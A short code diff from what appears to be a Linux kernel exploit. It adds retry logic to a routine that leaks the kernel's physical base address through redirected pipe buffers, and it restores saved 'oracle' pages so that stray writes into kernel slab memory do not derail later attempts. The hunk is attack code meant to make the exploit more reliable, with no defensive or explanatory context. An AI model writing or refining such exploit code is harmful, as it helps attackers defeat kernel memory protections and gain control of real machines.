@@ -1128,6 +1128,19 @@ static int slide_leak_physical_base(void) {
     if (gate_result == 0) {
       pr_warning("p0 physical pipe reclaim miss fresh=%d/%d\n",
                  fresh_attempt, fresh_page_attempts);
+      /*
+       * The gate slot trigger may have redirected a pipe buffer and
+       * executed the write even though the marker was not observed
+       * (write_window=0 or stale redirect target).  Restore the oracle
+       * pages so the next attempt starts from the saved snapshot
+       * instead of leaving a stray write in the slab page.  The retry
+       * reuses the same oracle session: rebuilding it tears down the
+       * keeper-less redirected pipes and put_page's kernel slab pages.
+       */
+      if (!slide_restore_physical_oracle()) {
+        pr_warning("p0 physical restore after reclaim miss failed "
+                   "fresh=%d/%d\n", fresh_attempt, fresh_page_attempts);
+      }
       fresh_attempt++;
       refresh_oracle = 1;
       continue;
